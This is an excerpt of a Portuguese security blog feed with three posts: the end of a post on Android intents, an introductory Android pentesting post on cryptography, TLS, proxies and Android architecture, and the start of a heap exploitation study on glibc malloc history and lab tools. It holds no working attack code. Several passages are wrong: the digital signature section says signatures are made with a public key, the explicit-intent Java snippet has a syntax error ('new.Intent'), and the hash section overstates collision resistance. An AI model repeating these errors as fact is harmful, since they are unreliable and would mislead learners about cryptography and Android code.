<p>Para realizar sua tarefa, os intents pordem utilizar vários mecanismos, por exemplo, chamar outra activity pode ser feito com <code class="language-plaintext highlighter-rouge">startActivity()</code> ou <code class="language-plaintext highlighter-rouge">startActivityForResult()</code> passando como argumento o intent, fazendo com que a aplicação abra uma novo recurso para interagir com o usuário. Pode iniciar um serviço com <code class="language-plaintext highlighter-rouge">startService()</code> ou <code class="language-plaintext highlighter-rouge">bindService()</code> passando como argumento a intent para iniciar um novo serviço. Ou entregar uma mensagem via broadcast, passando a intent como argumento para <code class="language-plaintext highlighter-rouge">sendBroadcast()</code>.</p>

<p>Existem dois tipos de intents:</p>

<ul>
  <li><strong>Explicit Intents</strong>: São intents que especificam qual aplicação irá receber o intent, esta aplicação alvo pode ser a própria aplicação que está chamando o intent ou aplicações deiferentes. Geralmente utilizado para chamar uma nova activity na própria aplicação.</li>
  <li><strong>Implicit Intents</strong>: São intents das quais não se especifica qual aplicação irá receber este intent, ao invés disso a ação é declarada. Desta forma, a aplicação vai passar este intent para o Android, e o próprio Android vai procurar um candidato a receber. Como exemplo, um aplicativo que vai compartilhar uma foto, inicia um Implicit Intent e o Android vai procurar todas as oitras aplicações que aceitam receber este compartilhamento.</li>
</ul>

<p>A imagem abaixo mostra o fluxo de comunicação de uma intent:</p>

<p><img src="/img/posts/mobile-08.png" alt="Fluxo da intent" title="Fluxo da intent" /></p>

<p>Neste fluxo, a <code class="language-plaintext highlighter-rouge">Activity A</code> de uma aplicação está passando sua intent através do <code class="language-plaintext highlighter-rouge">startActivity()</code> para o Android. O Android por sua vez, vai verificar se esta intent é específica para uma plicação, no caso de <code class="language-plaintext highlighter-rouge">explicit intent</code> ou se a intent é uma ação <code class="language-plaintext highlighter-rouge">implicit intent</code>, neste caso o Android vai varrer o sistema por aplicações que possam satisfazer a requisição feita e enviar o <code class="language-plaintext highlighter-rouge">onCreate()</code> para ela.</p>

<p>Uma intent possui as seguintes propriedades:</p>

<ul>
  <li><strong>Component Name</strong>: O nome do componente que será acessado, pode ser o nome do pacote de uma aplicação ou uma activity específica;</li>
  <li><strong>Action</strong>: Representa qual a intenção enviada, pode ser enviar uma mensagem, ou ver uma tela, entre outros;</li>
  <li><strong>Data</strong>: Contém a URI dos dados que serão passados para o componente que receberá este intent;</li>
  <li><strong>Category</strong>: Fornece informações adicionais para o componente que receberá este intent;</li>
  <li><strong>Extras</strong>: Algumas Activities precisam de parâmetros extras para seu funcionamento, e esta propriedade armazena tais informações.</li>
</ul>

<p>O código abaixo mostra uma Explicit Intent em <code class="language-plaintext highlighter-rouge">JAVA</code>.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Intent</span> <span class="n">downloadIntent</span> <span class="o">=</span> <span class="k">new</span><span class="o">.</span><span class="na">Intent</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="nc">DownloadService</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
<span class="n">downloadIntent</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="nc">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">fileUrl</span><span class="o">));</span>
<span class="n">startService</span><span class="o">(</span><span class="n">downloadIntent</span><span class="o">);</span>
</code></pre></div></div>

<p>O objetivo deste intent de exemplo, é fazer o download de um contúdo. Para isso é criado um objeto do tipo Intent, é passado como Data a URI do conteúdo a ser baixado e por fim chama o <code class="language-plaintext highlighter-rouge">startService()</code> chamando este objeto.</p>

<p>O código abaixo, mostra uma Implicit Intent em <code class="language-plaintext highlighter-rouge">JAVA</code></p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Cria a mensagem como uma string</span>
<span class="nc">Intent</span> <span class="n">sendIntent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
<span class="n">sendIntent</span><span class="o">.</span><span class="na">setAction</span><span class="o">(</span><span class="nc">Intent</span><span class="o">.</span><span class="na">ACTION_SEND</span><span class="o">);</span>
<span class="n">sendIntent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="nc">Intent</span><span class="o">.</span><span class="na">EXTRA_TEXT</span><span class="o">,</span> <span class="n">textMessage</span><span class="o">);</span>
<span class="n">sendIntent</span><span class="o">.</span><span class="na">setType</span><span class="o">(</span><span class="s">"text/plain"</span><span class="o">);</span>

<span class="c1">// Verifica se a intent será resolvida para uma aplicação</span>
<span class="k">if</span> <span class="o">(</span><span class="n">sendIntent</span><span class="o">.</span><span class="na">resolveActivity</span><span class="o">(</span><span class="n">getPackageManager</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">startActivity</span><span class="o">(</span><span class="n">sendIntent</span><span class="o">);</span>
<span class="o">}</span>
</code></pre></div></div>

<p>Neste caso, quando o <code class="language-plaintext highlighter-rouge">startActivity()</code> é chamado, o Android vai varrer o sistema por uma aplicação que exporte uma intent do tipo <code class="language-plaintext highlighter-rouge">ACTION_SEND</code> e devolver para o usuário escolher para qual aplicação quer exportar o texto.</p>

<p>Este processo mostrou como uma intent é enviada e como se comunica com o sistema, porém o outro lado da comunicação precisa <code class="language-plaintext highlighter-rouge">declarar</code> que pode receber uma intent.</p>

<p>Uma aplicação define quais os tipos de intent pode receber, através dos <code class="language-plaintext highlighter-rouge">intent filters</code> que fica dentro dos componentes no AndroidManifest.xml.<br />
Esta flag leva em consideração os elementos <code class="language-plaintext highlighter-rouge">action</code>, <code class="language-plaintext highlighter-rouge">data</code> e <code class="language-plaintext highlighter-rouge">category</code> que já vimos anteriormente. Sia sintaxe segue desta forma:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;intent-filter</span> <span class="na">android:icon=</span><span class="s">"drawable resource"</span>
               <span class="na">android:label=</span><span class="s">"string resource"</span>
               <span class="na">android:priority=</span><span class="s">"integer"</span> <span class="nt">&gt;</span>
    . . .
<span class="nt">&lt;/intent-filter&gt;</span>
</code></pre></div></div>

<h1 id="conclusão">CONCLUSÃO</h1>

<p>Neste artigo, foi possível obter um overview da anatomia de uma aplicação Android, nos próximos artigos exploraremos algumas ferramentas e técnicas pera o pentest nestas aplicações.</p>]]></content><author><name>H41stur</name></author><category term="Estudos" /><category term="Mobile" /><category term="Mobile" /><category term="Android" /><category term="Activity" /><category term="Services" /><category term="Content Providers" /><category term="Broadcast Receivers" /><category term="Intents" /><summary type="html"><![CDATA[]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/img/posts/android-logo.png" /><media:content medium="image" url="http://localhost:4000/img/posts/android-logo.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Pentesting Android P.1 - O Princípio</title><link href="http://localhost:4000/estudos/mobile/2022/06/01/mobile-1.html" rel="alternate" type="text/html" title="Pentesting Android P.1 - O Princípio" /><published>2022-06-01T01:00:00-03:00</published><updated>2022-06-01T01:00:00-03:00</updated><id>http://localhost:4000/estudos/mobile/2022/06/01/mobile-1</id><content type="html" xml:base="http://localhost:4000/estudos/mobile/2022/06/01/mobile-1.html"><![CDATA[<p><img src="/img/posts/android-logo.png" alt="Pentesting Android" title="Pentesting Android" /></p>

<ul>
  <li><a href="#introdução">INTRODUÇÃO</a></li>
  <li><a href="#o-princípio">O PRINCÍPIO</a></li>
  <li><a href="#criptografia">CRIPTOGRAFIA</a>
    <ul>
      <li><a href="#criptografia-simétrica">Criptografia Simétrica</a></li>
      <li><a href="#criptografia-assimétrica">Criptografia Assimétrica</a></li>
      <li><a href="#algorítmo-de-hash">Algorítmo de Hash</a></li>
      <li><a href="#assinatura-digital">Assinatura Digital</a></li>
      <li><a href="#certificado-digital">Certificado Digital</a></li>
    </ul>
  </li>
  <li><a href="#ssltls">SSL/TLS</a></li>
  <li><a href="#mtls">mTLS</a></li>
  <li><a href="#proxy">PROXY</a></li>
  <li><a href="#android-e-sua-arquitetura">ANDROID E SUA ARQUITETURA</a>
    <ul>
      <li><a href="#máquina-virtual-android-avm">Máquina Virtual Android (AVM)</a></li>
      <li><a href="#máquina-virtual-android-dalvik">Máquina Virtual Android (Dalvik)</a></li>
      <li><a href="#segurança-de-aplicativos-no-android">Segurança de Aplicativos no Android</a></li>
    </ul>
  </li>
  <li><a href="#conclusão">CONCLUSÃO</a></li>
</ul>

<h1 id="introdução">INTRODUÇÃO</h1>

<p>Recentemente surgiu o desafio profissional de me introduzir no universo dos testes em apk, o que logo no primeiro foi um tanto caótico, dada a necessidade do <code class="language-plaintext highlighter-rouge">fast learning</code> durante este período.</p>

<p>Bom, a falha grave, no <strong>meu ponto de vista</strong>, era simplesmente não estar preparado pelo menos com o mínimo esperado, ante um assunto aquecido no mercado.</p>

<p>Por conta disso, decidi separar uma parte deste ano, somente para me aprofundar nos estudos de pentesting mobile, e como meus estudos são bem melhores aproveitados quando eu expresso o aprendido de alguma forma, irei compartilhar em blog posts, toda a jornada de aprendizado.</p>

<h1 id="o-princípio">O PRINCÍPIO</h1>

<p>Aplicações mobile compreendem um universo de possibilidades que se convergem em vários pontos com outras áreas de segurança, portanto, antes de qualquer contato direto com técnicas específicas, é preciso pincelar sobre alguns temas básicos que fazem parte desta rotina, tais como:</p>

<ul>
  <li>Criptografia</li>
  <li>SSL/TLS</li>
  <li>mTLS</li>
  <li>Proxies</li>
  <li>Android e sua arquitetura</li>
</ul>

<h1 id="criptografia">CRIPTOGRAFIA</h1>

<p>A criptografia é um mecanismo aplicado a segurança e a privacidade utilizada para tornar a comunicação segura de diversas formas. A base principal da criptografia, desde sua origem a alguns séculos atrás, é tornar a comunicação initeligível para qualquer um que não tenha acesso aos mecanismos e códigos de tradução de uma mensagem.</p>

<p>Nas comunicações digitais, por exemplo, a criptografia tem grande papel na proteção de dados transmitidos entre dois ou mais nós, evitando que estes dados sejam lidos em texto claro, caso sejam interceptados, ou até mesmo evitando a interceptação em alguns casos.</p>

<p>Um mecanismo de criptografia tem como base, três principais elementos:</p>

<ul>
  <li><strong>Chave</strong>: Um código que utilizado para encriptar e/ou decriptar uma mensagem, funciona basicamente como a chave de uma porta, onde somente quem possui a mesma, consegue abrir ou fechar esta porta. No mundo digital, existem vários tipos de chave, sendo os mais convencionais simétrica e assimétrica. Sua existência é necessária, pois é inviável manter o algoritmo criptográfico em segredo, sendo assim, utiliza-se a chave criada a partir de um algoritmo de criptografia;</li>
  <li><strong>Encriptar</strong>: É o processo de codificar uma informação utilizando uma chave, de modo que seu resultado final seja algo incompreensível;</li>
  <li><strong>Decriptar</strong>: É o processo de decodificar uma mensagem encriptada utilizando uma chave, ou seja, uma informação encriptada com uma chave é initeligível até que seja decriptada utilizando uma chave.</li>
</ul>

<h2 id="criptografia-simétrica">Criptografia Simétrica</h2>

<p>Um sistema criptográfico é considerado simétrico quando é utilizada a mesma chave, uma chave privada, tanto para encriptar quanto para decriptar uma mensagem. A imagem abaixo mostra este fluxo.</p>

<p><img src="/img/posts/mobile-01.png" alt="Criptografia simétrica" title="Criptografia simétrica" /></p>

<h2 id="criptografia-assimétrica">Criptografia Assimétrica</h2>

<p>Um sistema criptográfico é considerado assimétrico quando são utilizadas duas chaves no processo de encriptação e decriptação, no caso uma chave <code class="language-plaintext highlighter-rouge">privada</code> e um chave <code class="language-plaintext highlighter-rouge">pública</code>. Neste cenário, a chave privada deve ser mantida em segredo e a chave pública pode ser compartilhada.</p>

<p>Neste fluxo de criptografia, a chave pública é utilizada para encriptar uma mensagem, enquanto que somente a chave privada consegue decriptá-la. A imagem abaixo exemplifica este fluxo.</p>

<p><img src="/img/posts/mobile-02.png" alt="Criptografia assimétrica" title="Criptografia assimétrica" /></p>

<h2 id="algorítmo-de-hash">Algorítmo de Hash</h2>

<p>A <code class="language-plaintext highlighter-rouge">hash</code> é um algorítmo que recebe qualquer comprimento de entrada, sejam eles qualquer tipo de dados, e mescla esta entrada para produzir uma saída <strong>pseudoaleatória</strong> de largura fixa, ou seja, independente da largura dos dados encriptados, seu resultado terá sempre uma largura fixa.</p>

<p>Uma hash é identificada pelas seguintes características:</p>

<ol>
  <li>Um algorítmo de hash sempre redumirá os dados de entrada em uma saída de tamanho fixo, independente do conteúdo de entrada;</li>
  <li>A saída de um algorítmo de hash é pseudoaleatória por princípios matemáticos;</li>
  <li>Se um único bit for alterado nos dados de entrada, a saída de uma hash será completamente diferente;</li>
  <li>Não pode ser reversível, ou seja, a partir de uma hash, é impossível reconstruir os dados de entrada, princípio conhecido como “função de via única”;</li>
  <li>Um algorítmo de hash não pode encontrar duas mensagens que produzam a mesma saída.</li>
</ol>

<p>Alguns algoritmos de hash conhecidos:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: center">Algorítmo</th>
      <th style="text-align: center">Tamanho de saída</th>
      <th style="text-align: center">Hashes possíveis</th>
      <th>Exemplo</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">MD5</td>
      <td style="text-align: center">16 Bytes / 128 bits</td>
      <td style="text-align: center">2<sup>128</sup></td>
      <td>196024cd532a9b08c8096eb3632a97b7</td>
    </tr>
    <tr>
      <td style="text-align: center">SHA-1</td>
      <td style="text-align: center">20 Bytes / 160 bits</td>
      <td style="text-align: center">2<sup>160</sup></td>
      <td>54aa06f5a16d8eb7d1141cf49ce3da68c81e90a4</td>
    </tr>
    <tr>
      <td style="text-align: center">SHA-256</td>
      <td style="text-align: center">32 Bytes / 256 bits</td>
      <td style="text-align: center">2<sup>256</sup></td>
      <td>ca08547be53fa295c6d3f127fc7692096150cd3a2f3a618991991eb0f9983ad6</td>
    </tr>
    <tr>
      <td style="text-align: center">SHA-512</td>
      <td style="text-align: center">64 Bytes / 512 bits</td>
      <td style="text-align: center">2<sup>512</sup></td>
      <td>abb5d711e31907f0021e346ce34ae7df7e5e866a5369811a4354b533fc451544<br />0ac9f9d5fa08e7ebf42787e4ca569c3a71378a6a4d112ce461628c5214c9632a</td>
    </tr>
  </tbody>
</table>

<h2 id="assinatura-digital">Assinatura Digital</h2>

<p>A assinatura digital, nada mais é que uma chave privada virtual, vinculada a um certificado digital, assim como uma assinatura em um papel, a assinatura digital assume a legalidade de uma assinatura comum.</p>

<p>Uma assinatura digital é composta de dois principais fundamentos:</p>

<ol>
  <li>A chave primária precisa ser segura e somente o proprietário desta chave possa utilizá-la;</li>
  <li>A única maneira de produzir uma assinatura digital seja utilizando uma chave pública.</li>
</ol>

<p>Portanto, para ter uma criptografia segura, os dados devem ser criptografados com a <code class="language-plaintext highlighter-rouge">chave pública</code> para que somente a <code class="language-plaintext highlighter-rouge">chave privada</code> possa decriptar.</p>

<h2 id="certificado-digital">Certificado Digital</h2>

<p>O certificado digital, nada mais é do que uma forma de associar uma chave pública a uma entidade de destino, pois ele associa esta chave a um nome. Ele é composto basicamente do nome, da chave pública e da assinatura digital.</p>

<p>A construção de um certificado digital, é feita de uma maneira que torna perceptível caso alguém ou algo com comportamento malicioso altere qualquer informação que o compõe.</p>

<p>A assinatura de um certificado digital, é normalmente (mas não sempre) feita pr meio de uma autoridade certificadora, ou “CA” (<em>Certification Authority</em>). Atualmente, o certificado digital mais utilizado segue o padrão <a href="https://datatracker.ietf.org/doc/html/rfc5280" title="RFC 5280">X.509</a>.</p>

<p>A estrutura de um certificado digital no padrão <code class="language-plaintext highlighter-rouge">X.509</code> segue exemplificado na imagem abaixo e também pode ser lida com detalhes na <a href="https://datatracker.ietf.org/doc/html/rfc5280#section-4.1.1">RFC 5280 na sessão 4.1.1</a>.</p>

<p><img src="/img/posts/mobile-03.png" alt="Estrutura do certificado no padão X.509" title="Estrutura do certificado no padão X.509" /></p>

<h1 id="ssltls">SSL/TLS</h1>

<p>O SSL/TLS (<em>Secure Sockets Layer</em> e <em>Transport Layer Security</em>) é utilizado para garantir a autenticidade e o sigilo na comunicação entre servidores e clientes, geralmente utilizado nos protocolos HTTP e SMTP.</p>

<p>O SSL/TLS adiciona uma nova camanda, ou <em>layer</em> na comunicação HTTP conforme ilustrado abaixo.</p>

<p><img src="/img/posts/mobile-04.png" alt="Requisição sem e com SSL/TLS" title="Requisição sem e com SSL/TLS" /></p>

<p>Durante o processo de comunicação entre um cliente e um servidor utilizando SSL, fluxo segue da seguinte maneira:</p>

<p><img src="/img/posts/mobile-05.png" alt="Comunicação via SSL" title="Comunicação via SSL" /></p>

<h1 id="mtls">mTLS</h1>

<p>O <code class="language-plaintext highlighter-rouge">mTLS</code> ou Mutual TLS é o proceso pelo qual o servidor solicita ao cliente um certificado TLS durante o estabelecimento do TLS, quendo este certificado é recebido, o servidor possui condições de avaliá-lo.</p>

<p>Este processo chamado de <em>TLS Handshake Certificate Request</em> é uma troca de mensagem opcional enviada do servidor para o cliente. Esta requisição é composta de uma lista de certificados digitais raiz aceitos pelo servidor.</p>

<p>Portanto, quando um cliente recebe esta requisição de um servidor, deve enviar uma resposta com ceu próprio certificado de um dos certificados raiz.</p>

<p>A imagem abaixo, ilustra este fluxo de comunicação.</p>

<p><img src="/img/posts/mobile-06.png" alt="Comunicação via mTLS" title="Comunicação via mTLS" /></p>

<h1 id="proxy">PROXY</h1>

<p>O <code class="language-plaintext highlighter-rouge">proxy</code>, de forma bem simplificada ,é um servidor que age como um intermediário entre requisições de clientes para outros servidores. Esta funçã de intermediação não só monitora, como pode filtrar e/ou armazenar dados transitados.</p>

<p>Desta forma, por mais que um proxy seja diferente de um <code class="language-plaintext highlighter-rouge">firewall</code>, ainda assim pode realizar filtros, e por mais que não seja um <code class="language-plaintext highlighter-rouge">cache</code> também pode implementar esta funcionalidade.</p>

<p>As proxies geralmente são divididas em duas categorias:</p>

<ol>
  <li><strong>Proxy ativo</strong>: O tipo de proxy que precisa ser configurado do lado do cliente, definindo o socket do proxy, o BurpSuite é um exemplo de proxy ativo;</li>
  <li><strong>Proxy transparente</strong>: Este proxy direciona conexões que passam por ele para um servidor ou aplicação específico local. Este tipo de proxy não exige configuração do lado do cliente que geralmente não sabe de sua existência. O webserber <code class="language-plaintext highlighter-rouge">NGINX</code> implementa este tipo de proxy.</li>
</ol>

<h2 id="web-application-proxy">Web Application Proxy</h2>

<p>O <code class="language-plaintext highlighter-rouge">web application proxy</code> atua diretamente na camada de aplicação, ou seja, na camada 7 do modelo <a href="https://www.cloudflare.com/learning/ddos/glossary/open-systems-interconnection-model-osi/" title="OSI model">OSI</a> e permitem que os payloads dasrequisições e respostas do protocolo HTTP sejam filtradas, analisadas e armazenadas.</p>

<h1 id="android-e-sua-arquitetura">ANDROID E SUA ARQUITETURA</h1>

<p>O <code class="language-plaintext highlighter-rouge">Android</code> é um sistema operacional de código aberto baseado em Linux, inicialmente para dispositivos móveis, porém largamente utilizado em diversos outros dispositivos.</p>

<p>A arquitetura do sistema Androide consiste em uma série de componentes que podem ser separados em ses camadas, a imagem abaixo foi retirada da própria <a href="https://developer.android.com/guide/platform">Android Developers</a> e listra estas camadas.</p>

<p><img src="/img/posts/mobile-07.png" alt="Arquitetura Android" title="Arquitetura Android" /></p>

<p>Onde:</p>

<ul>
  <li><strong><code class="language-plaintext highlighter-rouge">Camada System Apps</code></strong>: É a camada onde as aplicações são instaladas, armazenadas e executadas. Nesta camada, estão os instalados os aplicativos nativos e os aplicativos do usuário;</li>
  <li><strong><code class="language-plaintext highlighter-rouge">Camada Java API Framework</code></strong>: Esta camada fornece as APIs do sistema para serem utilizadas pelas funcionalidades comuns das aplicações, tais como funcionalidades de compartilhamento de dados, acesso ao telefone, GPS e elementos visuais;</li>
  <li><strong><code class="language-plaintext highlighter-rouge">Camada Native C/C++ Libraries</code></strong>: Esta camada fornece as bibliotecas C e C++ que são utilizadas para gerenciar processos em baixo nível, processos como encriptação, renderização de imagens e multimídia, entre outros;</li>
  <li><strong><code class="language-plaintext highlighter-rouge">Camada Android Runtime</code></strong>: Cada aplicação dentro do Android executa em uma própria máquina virtual, por fins de segurança e integridade. E é nesta camada que reside a máquina virtual responsável pelas aplicações em execução;</li>
  <li><strong><code class="language-plaintext highlighter-rouge">Camada Hardware Abstraction Layer (HAL)</code></strong>: Esta camada define os padrões para os fabricantes de hardware implementarem suas funcionalidades. Utilizando a HAL, os fabricantes podem implementar suas funcionalidades sem afetar o sistema em alto nível;</li>
  <li><strong><code class="language-plaintext highlighter-rouge">Camada Linux Kernel</code></strong>: Esta camada contém o kernel Android que é baseado no kernel Linux 2.6. O kernel é responsável pelo gerenciamento de memória, processos e energia. Esta camada é responsável por controlar o acesso ao hardware do dispositivo por meio de drivers. Como sendo a camada base, ela é quem une todas as camadas superiores.</li>
</ul>

<h2 id="máquina-virtual-android-avm">Máquina Virtual Android (AVM)</h2>

<p>As máquinas virtuais são basicamente camadas abstração entre uma aplicação e as camadas subjacentes do dispositivo. Os aplicativos Android e o Java API Framework são desenvolvidos na linguagem de programação Java ou Kotlin e são executados dentro de uma máquina virtual Dalvik.</p>

<h2 id="máquina-virtual-android-dalvik">Máquina Virtual Android (Dalvik)</h2>

<p>O Dalvik é uma máquina virtual baseada em registro que interpreta códigos em baixo nível em bytes do <code class="language-plaintext highlighter-rouge">Executável Dalvik (DEX)</code>. Para seu funcionamento, o Dalvik depende de funcionalidades fornecidas por várias bibliotecas de código nativo de suporte.</p>

<p>Isso se torna necessário, para que o sistema consiga suportar todas as diferenças entre sistemas operacionais sem que o desenvolvedor precise desenvolver aplicativos diferentes para dispositivos específicos.</p>

<h2 id="segurança-de-aplicativos-no-android">Segurança de Aplicativos no Android</h2>

<p>Por padrão, os aplicativos Android não tem acesso direto a recursos de hardware e cada aplicativo é executado em sua própria <code class="language-plaintext highlighter-rouge">sandbox</code>, ou seja, cada aplicativo é executado “enjaulado” em um ambiente. Como o Android é baseado em Linux, o sistema de permissionamento é similar ao permissionamento entre usuários, onde cada usuário compartilha recursos do sistema, mas não tem acesso a ambientes e recursos específicos de outros usuários.</p>

<p>Isto ocorre, para permitir o controle preciso sobre recursos, pois não permite que um aplicativo com falha ou malicioso efete outros aplicativos em execução no dispositivo.</p>

<h1 id="conclusão">CONCLUSÃO</h1>

<p>Acredito que isto é o básico para iniciar o entendimento sobre Android e seu funcionamento, antes de iniciar os testes em aplicativos.<br />
Com estas informações em mente, avancaremos nos próximos artigos.</p>]]></content><author><name>H41stur</name></author><category term="Estudos" /><category term="Mobile" /><category term="Mobile" /><category term="Android" /><category term="Criptografia" /><category term="Certificado" /><summary type="html"><![CDATA[]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/img/posts/android-logo.png" /><media:content medium="image" url="http://localhost:4000/img/posts/android-logo.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Heap Exploitation P.1</title><link href="http://localhost:4000/papers/heap%20exploitation/2022/05/10/paper-heap.html" rel="alternate" type="text/html" title="Heap Exploitation P.1" /><published>2022-05-10T01:00:00-03:00</published><updated>2022-05-10T01:00:00-03:00</updated><id>http://localhost:4000/papers/heap%20exploitation/2022/05/10/paper-heap</id><content type="html" xml:base="http://localhost:4000/papers/heap%20exploitation/2022/05/10/paper-heap.html"><![CDATA[<h1 id="resumo">RESUMO</h1>

<p>Este estudo apresenta uma introdução às técnicas de exploração de memória dinâmica em binários para o sistema operacional Linux. Ao final deste laboratório, foi possível compreender a arquitetura da memória dinâmica e possíveis formas de explorar vulnerabilidades conhecidas, assim como entender suas mitigações.</p>

<h1 id="introdução">INTRODUÇÃO</h1>

<p>Desde 1998, quando a alocação de memória dinâmica foi implementada, houveram várias tentativas de exploração e sucessos pouco claros. Porém, em 11 de agosto de 2001, dois papers foram publicados com o intuito de demonstrar os “novos avanços” em exploração de vulnerabilidades. <code class="language-plaintext highlighter-rouge">MaXX</code> o autor do paper “<em>Vudo malloc tricks</em>” (encontrado em <a href="http://phrack.org/issues/57/8.html">phrack.org/issues/57/8.html</a>) descreveu a implementação básica e algoritmos da <code class="language-plaintext highlighter-rouge">GNU C Library</code> e apresentou ao público vários métodos para conseguir execução de código através de <code class="language-plaintext highlighter-rouge">heap overflow</code>. Ao mesmo tempo mostrou um exploit real da aplicação <code class="language-plaintext highlighter-rouge">sudo</code>.</p>

<p>Na mesma época, uma pessoa anônima escreveu um artigo chamado “<em>Once upon a free()</em>” (encontrado em <a href="http://phrack.org/issues/57/9.html">phrack.org/issues/57/9.html</a>) onde seu objetivo principal foi explicar sobre a implementação da <code class="language-plaintext highlighter-rouge">System V malloc</code>.</p>

<p>Em agosto de 2003 o artigo chamado “<em>Advanced
Doug Lea’s malloc exploits</em>” (encontrado em <a href="http://phrack.org/issues/61/6.html">phrack.org/issues/61/6.html</a>) publicado por <code class="language-plaintext highlighter-rouge">JP</code>, desenvolvia uma forma mais avançada de exploração baseada nos artigos anteriores. Este talvez, tenha sido a maior inspiração para o que estaria por vir.</p>

<p>Este artigo demonstrou duas técnicas de exploração:</p>

<ul>
  <li>método <code class="language-plaintext highlighter-rouge">unlink()</code></li>
  <li>método <code class="language-plaintext highlighter-rouge">frontlink()</code></li>
</ul>

<p>Estes métodos foram aplicados até o ano de 2004 quando a GLIBC foi mitigou estas vulnerabilidades e os exploits não funcionavam mais.</p>

<p>Porém, em outubro de 2005, uma pessoa identificada como <code class="language-plaintext highlighter-rouge">Phantasmal Phantasmagoria</code> publicou na <em>mailing list</em> da <code class="language-plaintext highlighter-rouge">bugtrack</code>, um artigo que chamou a atenção intitulado <em><code class="language-plaintext highlighter-rouge">Malloc Maleficarum</code></em> (encontrado em <a href="https://bugtraq.securityfocus.com/detail/20051011171415.9AE8233C23">bugtraq.securityfocus.com/detail/20051011171415.9AE8233C23</a>).</p>

<p><code class="language-plaintext highlighter-rouge">Phantasmal</code> também é o autor do artigo “<em>Exploiting the 
Wilderness</em>” (encontrado em <a href="https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Heap%20Bug%20-%20Exploiting%20the%20wilderness%20-%20Phantasmal%20Phantasmagoria.txt">repository.root-me.org/</a>) também muito relevante na área.</p>

<p>O <em>Malloc Maleficarum</em> era um representação totalmente teórica do que se tornaria o avanço nas habilidades de exploração no que diz respeito a <em>heap</em>. Seu autor, separou cada uma das técnicas, as nomeando como:</p>

<ul>
  <li>The House of Prime</li>
  <li>The House of Mind</li>
  <li>The House of Force</li>
  <li>The House of Lore</li>
  <li>The House of Spirit</li>
  <li>The House of Chaos (conclusão)</li>
</ul>

<p>Este artigo abriu novamente os horizontes do que diz respeito a exploração da memória <em>heap</em>, porém a única falha deste artigo, é que ele não trazia nenhuma prova de conceito real para demonstrar as técnicas apresentadas.</p>

<p>Em janeiro de 2007, uma pessoa identificada como <code class="language-plaintext highlighter-rouge">K-sPecial</code> publicou um artigo chamado “<em>The House of Mind</em>” (encontrado em <a href="https://www.exploit-db.com/papers/13112">www.exploit-db.com/papers/13112</a>). Junto com este artigo, ele trouxe uma prova de conceito funcional, provando pela primeira vez de forma pública que a técnica de <code class="language-plaintext highlighter-rouge">The House of Mind</code> era real.</p>

<p>Ao longo dos anos seguintes, não só as demias técnicas do <em>Malloc Maleficarum</em> se provaram efetivas, como novas técnicas e “Houses” foram criadas.</p>

<p>Ao longo deste estudo, vamos entender primeiramente como a memória dinâmica é implementada no kernel Linux, assim como entender algumas das técnicas expressadas no <em>Malloc Maleficarum</em> de forma gradual.</p>

<h1 id="recursos">RECURSOS</h1>

<p>Durante a execução dos experimentos propostos neste documento, serão utilizados alguns recursos, todos podem ser encontrados de forma livre na internet. São eles:</p>

<ul>
  <li>GDB (<em>GNU Debugger</em>)</li>
  <li>GDB Server</li>
  <li>PWNDBG (encontrado em <a href="https://github.com/pwndbg/pwndbg#:~:text=Pwndbg%20is%20a%20Python%20module,to%20fill%20some%20these%20gaps.">github.com/pwndbg/pwndbg</a>)</li>
  <li>O módulo PWNTOOLS do Python</li>
  <li>one_gadget (encontrado em <a href="https://github.com/david942j/one_gadget">github.com/david942j/one_gadget</a>)</li>
  <li>Binários vulneráveis (encontrados em <a href="https://github.com/limitedeternity/HeapLAB">github.com/limitedeternity/HeapLAB</a>)</li>
</ul>

<h1 id="implementação-da-alocação-de-memória-dinâmica">IMPLEMENTAÇÃO DA ALOCAÇÃO DE MEMÓRIA DINÂMICA</h1>

<p>Antes de partirmos para prática, é necessário esclarecer alguns conceitos básicos sobre a implementação da <em>malloc</em>:</p>

<h2 id="glibc">GLIBC</h2>

<p>A <strong>GNU C Library</strong> (GLIBC) conforme descrito em sua documentação em <a href="https://www.gnu.org/software/libc/">gnu.org/software/libc/</a> fornece as bibliotecas do <em>core</em> para os sistemas GNU e GNU/Linux assim como diversos outros sistemas que utilizam o kernel Linux.</p>

<p>Estas bibliotecas fornecem APIs críticas que incluem algumas instalações fundamentais como <em>open, read, write, malloc, printf, exit…</em> entre diversas outras.</p>

<p>As bibliotecas GLIBC são <em>open source</em> e assumem a forma de <em>shared objects</em> ou objetos compartilhados, o equivalente no Linux as DLL no Windows e são uma parte fundamental dos sistemas operacionais Linux.</p>

<p>O uso da GLIBC é largamente utilizada nos ultimos 30 anos em ambos, desktop e sistemas embarcados, incluindo distribuições comuns como Debian, Ubuntu, Arch entre centenas.</p>

<p>As funções fornecidas pela GLIBC são utilizadas em programas escritos em C e C++ e como sonsequência, em linguagens de alto nível como Python, dos quais seus interpretadores são escritos em C.</p>

<p>De forma simples, nas infinidades de distribuições Linux, é difícil encontrar um processo que não mapeie um dos objetos compartilhados da GLIBC em memória.</p>

<p>No exemplo abaixo, será mostrado como a GLIBC é utilizada em uma aplicação Linux na distribuição Debian 11 LTS (<em>Long Term Support</em>).</p>

